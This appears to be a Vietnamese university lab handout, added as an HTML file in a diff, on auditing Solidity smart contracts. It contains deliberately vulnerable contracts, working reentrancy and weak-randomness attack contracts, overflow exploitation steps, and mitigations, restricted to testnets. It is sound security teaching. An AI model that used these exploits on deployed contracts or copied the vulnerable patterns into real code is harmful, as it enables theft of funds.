@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 5: Phân tích & Khai thác Lỗ hổng Smart Contract (Nâng cao)</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; padding: 2em; max-width: 900px; margin: auto; color: #333; background-color: #f9f9f9; }
+        h1, h2, h3, h4 { color: #1a1a1a; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        h1 { text-align: center; color: #0056b3; border: none; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        pre { background-color: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #444; overflow-x: auto; }
+        code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; color: #ff79c6; }
+        .task-box { border: 1px solid #cfe2ff; background-color: #e7f1ff; padding: 15px; border-radius: 5px; margin-top: 20px; margin-bottom: 20px; }
+        .warning-box { border: 1px solid #f5c6cb; background-color: #f8d7da; padding: 15px; border-radius: 5px; margin-top: 10px; }
+        .challenge-level { display: inline-block; padding: 3px 8px; border-radius: 4px; color: white; font-weight: bold; font-size: 0.8em; margin-left: 10px; }
+        .level-easy { background-color: #28a745; }
+        .level-medium { background-color: #ffc107; color: #333; }
+        .level-hard { background-color: #dc3545; }
+        .level-expert { background-color: #6f42c1; }
+        ul, ol { padding-left: 20px; }
+        li { margin-bottom: 0.8em; }
+        .requirement { font-weight: bold; color: #d63384; }
+        .hint-header { font-weight: bold; cursor: pointer; color: #0056b3; margin-top: 10px; }
+        details { margin-top: 10px; border: 1px dashed #aaa; padding: 10px; border-radius: 5px; background-color: #fff; }
+        summary { font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>BÀI THỰC HÀNH 5: SECURITY & AUDIT SMART CONTRACT</h2>
+    <p><strong>Môn học:</strong> NT547 - Blockchain Nền tảng, ứng dụng và bảo mật</p>
+    <p><strong>Lưu ý quan trọng:</strong> Sinh viên phải thực hiện trên Remix IDE, Deploy trên mạng Testnet (Sepolia/Amoy) hoặc Remix VM. Báo cáo phải chứa ảnh chụp màn hình minh chứng cho từng bước thực hiện (transaction logs, console, thay đổi số dư).</p>
+
+    <div class="warning-box">
+        <strong>Cảnh báo an toàn:</strong> Tất cả mã nguồn trong bài Lab này đều chứa lỗ hổng bảo mật. TUYỆT ĐỐI KHÔNG triển khai chúng trên mạng Mainnet (Ethereum Mainnet, BSC Mainnet...) để tránh mất tiền thật.
+    </div>
+
+    <!-- PHẦN 1: REENTRANCY -->
+    <h2>Phần 1: Tấn công Tái nhập (Reentrancy) <span class="challenge-level level-easy">Cơ bản</span></h2>
+    
+    <h3>1.1. Tái hiện kịch bản tấn công</h3>
+    
+    <div class="task-box">
+        <h4>Yêu cầu 1 (Bắt buộc):</h4>
+        <p>Sử dụng mã nguồn <code>EtherStore.sol</code> và <code>Attack.sol</code> dưới đây để thực hiện tấn công rút cạn tiền.</p>
+        
+        <details>
+            <summary>Bấm để xem Code mẫu EtherStore.sol & Attack.sol</summary>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract EtherStore {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+        // LỖ HỔNG: Gửi tiền trước khi cập nhật số dư
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+        balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    function attack() public payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // Hàm này được gọi khi EtherStore gửi ETH về
+    receive() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
+    }
+}</code></pre>
+        </details>
+
+        <p><strong>Hướng dẫn từng bước:</strong></p>
+        <ol>
+            <li>Copy code vào Remix IDE, tạo 2 file riêng hoặc chung 1 file.</li>
+            <li>Compile với phiên bản <code>0.8.20</code>.</li>
+            <li>Triển khai <code>EtherStore</code> trước.</li>
+            <li>Chuyển Account sang ví khác, nạp <strong>5 Ether</strong> vào <code>EtherStore</code> qua hàm <code>deposit</code>.</li>
+            <li>Copy địa chỉ contract <code>EtherStore</code>.</li>
+            <li>Triển khai <code>Attack</code> với tham số constructor là địa chỉ <code>EtherStore</code> vừa copy.</li>
+            <li>Gọi hàm <code>attack</code> của contract <code>Attack</code> với Value là <strong>1 Ether</strong>.</li>
+            <li><strong>Báo cáo:</strong> Chụp ảnh số dư cuối cùng của <code>Attack</code> contract và Logs giao dịch (thể hiện hàm withdraw được gọi nhiều lần).</li>
+        </ol>
+    </div>
+
+    <h3>1.2. Phòng chống thủ công (Không dùng thư viện) <span class="challenge-level level-medium">Trung bình</span></h3>
+
+    <div class="task-box">
+        <h4>Yêu cầu 2 (Coding):</h4>
+        <p>Viết contract <code>EtherStore_ManualLock.sol</code> sử dụng cơ chế Mutex (cờ khóa) để chặn Reentrancy.</p>
+        
+        <details>
+            <summary>Gợi ý Code (Sinh viên cần điền vào chỗ trống)</summary>
+<pre><code>contract EtherStore_ManualLock {
+    bool internal locked; // Biến cờ khóa
+
+    // Định nghĩa modifier để chặn gọi lại
+    modifier noReentrant() {
+        require(!locked, "No re-entrancy");
+        locked = true; // Khóa lại trước khi chạy hàm
+        _;
+        locked = false; // Mở khóa sau khi chạy xong
+    }
+
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // Áp dụng modifier vào đây
+    function withdraw() public noReentrant {
+        // ... Copy logic rút tiền từ bài trước vào đây ...
+    }
+}</code></pre>
+        </details>
+
+        <p><strong>Hướng dẫn từng bước:</strong></p>
+        <ol>
+            <li>Hoàn thiện code dựa trên gợi ý trên.</li>
+            <li>Triển khai <code>EtherStore_ManualLock</code>.</li>
+            <li>Triển khai lại <code>Attack.sol</code> (trỏ vào địa chỉ contract mới này).</li>
+            <li>Thực hiện tấn công và quan sát lỗi trên Remix Console.</li>
+            <li><strong>Báo cáo:</strong> Chụp ảnh màn hình lỗi revert chứng minh tấn công thất bại.</li>
+        </ol>
+    </div>
+
+    <!-- PHẦN 2: INTEGER OVERFLOW -->
+    <h2>Phần 2: Tràn số (Overflow) & Unchecked Block <span class="challenge-level level-medium">Trung bình</span></h2>
+
+    <div class="task-box">
+        <h4>Yêu cầu 3 (Xây dựng & Khai thác):</h4>
+        <p>Lợi dụng khối <code>unchecked</code> trong Solidity 0.8.x để vượt qua kiểm tra số dư.</p>
+
+        <details>
+            <summary>Gợi ý Code RiskyToken.sol</summary>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract RiskyToken {
+    mapping(address => uint256) public balances;
+
+    constructor() {
+        balances[msg.sender] = 1000; // Mint cho deployer
+    }
+
+    function batchTransfer(address[] calldata receivers, uint256 value) external {
+        // LỖ HỔNG NẰM Ở ĐÂY
+        uint256 totalAmount;
+        
+        // Sử dụng unchecked cho phép nhân để tối ưu gas nhưng gây nguy hiểm
+        unchecked {
+            totalAmount = receivers.length * value;
+        }
+
+        require(balances[msg.sender] >= totalAmount, "Insufficient balance");
+
+        balances[msg.sender] -= totalAmount;
+        for (uint i = 0; i < receivers.length; i++) {
+            balances[receivers[i]] += value;
+        }
+    }
+}</code></pre>
+        </details>
+
+        <p><strong>Hướng dẫn từng bước & Câu hỏi gợi ý:</strong></p>
+        <ol>
+            <li>Triển khai <code>RiskyToken</code>. SV sẽ có 1000 token.</li>
+            <li>Giả sử SV muốn hack để gửi số tiền khổng lồ mà không bị trừ đúng số dư.</li>
+            <li>Hãy tính toán: <code>receivers.length * value</code> cần phải bằng bao nhiêu để bị tràn số (Overflow) về một số nhỏ hơn 1000?
+                <ul>
+                    <li>Gợi ý: <code>type(uint256).max</code> là khoảng <code>1.1579... x 10^77</code>.</li>
+                    <li>Nếu SV chọn mảng <code>receivers</code> có 2 địa chỉ. Hãy tìm <code>value</code> sao cho: <code>2 * value = (MAX_UINT + 1) + số_nhỏ</code>.</li>
+                    <li>Khi đó <code>totalAmount</code> sẽ trở thành <code>số_nhỏ</code>, qua mặt được <code>require</code>, nhưng <code>balances[receivers[i]]</code> lại được cộng <code>value</code> cực lớn.</li>
+                </ul>
+            </li>
+            <li><strong>Báo cáo:</strong> Chụp ảnh số dư của người nhận sau khi hack thành công (số dư sẽ cực lớn).</li>
+        </ol>
+    </div>
+
+    <!-- PHẦN 3: RANDOMNESS VULNERABILITY -->
+    <h2>Phần 3: Lỗ hổng Randomness (Yếu tố ngẫu nhiên) <span class="challenge-level level-hard">Khó</span></h2>
+    
+    <div class="task-box">
+        <h4>Yêu cầu 4 (Tự triển khai Game & Hack):</h4>
+        <p>Dự đoán kết quả ngẫu nhiên dựa trên biến môi trường Blockchain.</p>
+
+        <details>
+            <summary>Code mẫu WeakLottery.sol</summary>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract WeakLottery {
+    function play() public payable {
+        require(msg.value == 0.1 ether);
+        // Random yếu dựa trên timestamp
+        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 2;
+        
+        if (random == 1) {
+            // Thắng: Trả lại tiền + thưởng
+            payable(msg.sender).transfer(0.2 ether);
+        }
+    }
+    
+    // Nạp tiền vào quỹ thưởng
+    receive() external payable {}
+}</code></pre>
+        </details>
+
+        <p><strong>Hướng dẫn viết LotteryAttacker.sol:</strong></p>
+        <ul>
+            <li>Sinh viên cần viết một contract tấn công. Trong hàm tấn công, SV thực hiện chính xác công thức tính random của <code>WeakLottery</code>.</li>
+            <li><strong>Mẹo:</strong> Khi contract A gọi contract B, cả hai đều chạy trong cùng một Block, nên <code>block.timestamp</code> là GIỐNG HỆT NHAU.</li>
+            <li>Tuy nhiên, lưu ý biến <code>msg.sender</code> trong công thức của <code>WeakLottery</code>. Khi SV gọi từ contract Attacker, <code>msg.sender</code> lúc này là địa chỉ của Attacker.</li>
+        </ul>
+
+        <details>
+            <summary>Gợi ý Code Attacker (Chưa hoàn chỉnh)</summary>
+<pre><code>contract LotteryAttacker {
+    WeakLottery public lottery;
+
+    constructor(address _lottery) {
+        lottery = WeakLottery(_lottery);
+    }
+
+    function attack() public payable {
+        // Tính trước kết quả y hệt logic của nạn nhân
+        // Lưu ý: msg.sender ở đây chính là địa chỉ của contract này (address(this))
+        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 2;
+        
+        if (guess == 1) {
+            // Chỉ chơi nếu biết chắc chắn thắng
+            lottery.play{value: 0.1 ether}();
+        } else {
+            // Nếu thua thì không chơi, đợi block sau
+            revert("Khong choi vi se thua");
+        }
+    }
+    
+    receive() external payable {}
+}</code></pre>
+        </details>
+
+        <p><strong>Báo cáo:</strong> Deploy Lottery, nạp quỹ. Deploy Attacker. Gọi hàm <code>attack</code> nhiều lần. Chứng minh SV chỉ mất gas fee chứ không bao giờ mất tiền cược.</p>
+    </div>
+
+    <!-- PHẦN 4: ADVANCED / DENIAL OF SERVICE -->
+    <h2>Phần 4: Từ chối dịch vụ (DoS via Gas Limit) <span class="challenge-level level-expert">Nâng cao</span></h2>
+    
+    <div class="task-box">
+        <h4>Yêu cầu 5 (Mô phỏng & Giải pháp):</h4>
+        <p>Lỗ hổng này xảy ra khi vòng lặp xử lý quá nhiều phần tử, vượt quá giới hạn Gas của một Block.</p>
+
+        <details>
+            <summary>Code mẫu RefundPool (Lỗi DoS)</summary>
+<pre><code>contract RefundPool {
+    address[] public users;
+    mapping(address => uint) public balances;
+
+    function deposit() external payable {
+        users.push(msg.sender);
+        balances[msg.sender] += msg.value;
+    }
+
+    function refundAll() external {
+        // Vòng lặp này sẽ tốn quá nhiều gas nếu mảng users quá lớn
+        for (uint i = 0; i < users.length; i++) {
+            address user = users[i];
+            uint amount = balances[user];
+            balances[user] = 0;
+            (bool success, ) = user.call{value: amount}("");
+            require(success);
+        }
+    }
+}</code></pre>
+        </details>
+
+        <p><strong>Hướng dẫn thực hiện:</strong></p>
+        <ol>
+            <li>Triển khai <code>RefundPool</code>.</li>
+            <li>Tạo một contract phụ tên <code>Spammer</code> để thêm 100 user giả vào Pool.
+                <pre><code>// Gợi ý Spammer
+contract Spammer {
+    function spam(address pool) public payable {
+        for(uint i=0; i<50; i++) {
+            // Gọi deposit của pool (logic giả lập)
+            // Có thể cần deploy nhiều contract con hoặc dùng trick khác để tạo nhiều address
+            // Cách đơn giản nhất cho Lab: Gọi deposit thủ công 10-20 lần hoặc dùng script js trong Remix.
+        }
+    }
+}</code></pre>
+                <em>(Lưu ý: Để đơn giản hóa bài lab này, SV có thể chỉ cần gọi deposit thủ công khoảng 15-20 lần và quan sát thanh Gas Cost tăng lên như thế nào).</em>
+            </li>
+            <li><strong>Giải pháp Pull Over Push:</strong> Thay vì dùng vòng lặp <code>refundAll</code>, hãy viết hàm <code>withdraw</code> để từng user tự rút tiền của mình.</li>
+        </ol>
+
+        <details>
+            <summary>Gợi ý Code Secure (Pull Pattern)</summary>
+<pre><code>contract RefundPool_Secure {
+    mapping(address => uint) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // Không còn hàm refundAll
+    // User phải tự gọi hàm này -> Tránh DoS
+    function withdraw() external {
+        uint amount = balances[msg.sender];
+        require(amount > 0);
+        balances[msg.sender] = 0;
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success);
+    }
+}</code></pre>
+        </details>
+
+        <p><strong>Báo cáo:</strong> Giải thích tại sao cách làm Secure lại không bị ảnh hưởng bởi số lượng người dùng (O(1) so với O(n)).</p>
+    </div>
+
+    <h2>Phần 5: Tổng kết & Báo cáo</h2>
+    <div class="task-box">
+        <p>Sinh viên tổng hợp báo cáo định dạng <code>.pdf</code> bao gồm:</p>
+        <ol>
+            <li>Thông tin sinh viên (MSSV, Họ tên).</li>
+            <li>Với mỗi Yêu cầu (1 đến 5):
+                <ul>
+                    <li>Tiêu đề bài tập.</li>
+                    <li>Source code (dán text, format đẹp).</li>
+                    <li><strong>Ảnh chụp màn hình minh chứng:</strong> Phải thể hiện được các bước triển khai, logs kết quả, và số dư thay đổi.</li>
+                </ul>
+            </li>
+        </ol>
+    </div>
+
+</div>
+
+</body>
+</html>
